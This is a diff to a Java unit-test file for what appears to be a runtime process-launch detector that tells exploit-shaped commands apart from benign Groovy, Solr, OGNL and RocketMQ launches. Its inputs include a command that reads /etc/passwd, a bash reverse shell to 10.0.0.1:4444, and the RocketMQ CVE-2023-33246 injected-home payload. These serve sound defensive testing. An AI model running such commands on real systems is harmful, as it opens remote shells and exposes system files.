@@ -127,6 +127,27 @@ final class ProcessDetectorTest {
     assertAlgorithm(result, "script_runtime");
   }
 
+  /**
+   * A context-dependent stack finding (a script engine, Solr's configured listener) does not hide intrinsic evidence
+   * on the same launch: exploit-shaped arguments are command_common, and an expression language below the script
+   * engine is expression evaluation. Without such evidence the stack finding stands.
+   */
+  @Test
+  void intrinsicEvidenceWinsOverAContextDependentStackFinding() {
+    List<String> groovy = List.of("org.codehaus.groovy.runtime.ProcessGroovyMethods");
+    List<String> solr = List.of("org.apache.solr.core.RunExecutableListener");
+    RequestContext none = RequestContext.empty();
+    assertAlgorithm(ProcessDetector.detectCommand(List.of("sh", "-c", "cat /etc/passwd"), none, groovy), "command_common");
+    assertAlgorithm(ProcessDetector.detectCommand(List.of("bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"), none,
+        solr), "command_common");
+    var nested = ProcessDetector.detectCommand(List.of("id"), none,
+        List.of("org.codehaus.groovy.runtime.ProcessGroovyMethods", "ognl.OgnlRuntime"));
+    assertAlgorithm(nested, "ognl_runtime");
+    assertEquals("expression_evaluation", nested.orElseThrow().details().get("decision_basis"));
+    assertAlgorithm(ProcessDetector.detectCommand(List.of("ls", "-l"), none, groovy), "script_runtime");
+    assertAlgorithm(ProcessDetector.detectCommand(List.of("ls", "-l"), none, solr), "command_config_listener");
+  }
+
   @Test
   void detectsGremlinGroovyCommandStack() {
     var result =
@@ -161,9 +182,11 @@ final class ProcessDetectorTest {
 
   @Test
   void detectsRocketMqCve202333246RuntimeConfigCommandLauncherStack() {
+    // FilterServerUtil.callShell splits "sh <rocketmqHome>/bin/startfsrv.sh ..." on spaces; the exploit's home
+    // "-c $@|sh . echo touch /tmp/success;" makes the inline program "$@|sh".
     var result =
         ProcessDetector.detectCommand(
-            List.of("sh", "-c", "touch /tmp/success"),
+            List.of("sh", "-c", "$@|sh", ".", "echo", "touch", "/tmp/success;/bin/startfsrv.sh"),
             RequestContext.empty(),
             List.of(
                 "java.lang.Runtime",
@@ -174,6 +197,22 @@ final class ProcessDetectorTest {
     assertEquals(
         "org.apache.rocketmq.broker.filtersrv.FilterServerManager",
         result.orElseThrow().details().get("launcher"));
+    assertEquals("configuration_launcher", result.orElseThrow().details().get("decision_basis"));
+  }
+
+  /** The broker's own filter-server start has no shell operator: nothing to report, as on the backports. */
+  @Test
+  void aRocketMqFilterServerStartWithoutShellOperatorsIsNotReported() {
+    var result =
+        ProcessDetector.detectCommand(
+            List.of("sh", "/opt/rocketmq/bin/startfsrv.sh", "-c", "/opt/rocketmq/conf/fsrv.properties"),
+            RequestContext.empty(),
+            List.of(
+                "java.lang.Runtime",
+                "org.apache.rocketmq.broker.filtersrv.FilterServerUtil",
+                "org.apache.rocketmq.broker.filtersrv.FilterServerManager"));
+
+    assertTrue(result.isEmpty(), String.valueOf(result));
   }
 
   @Test
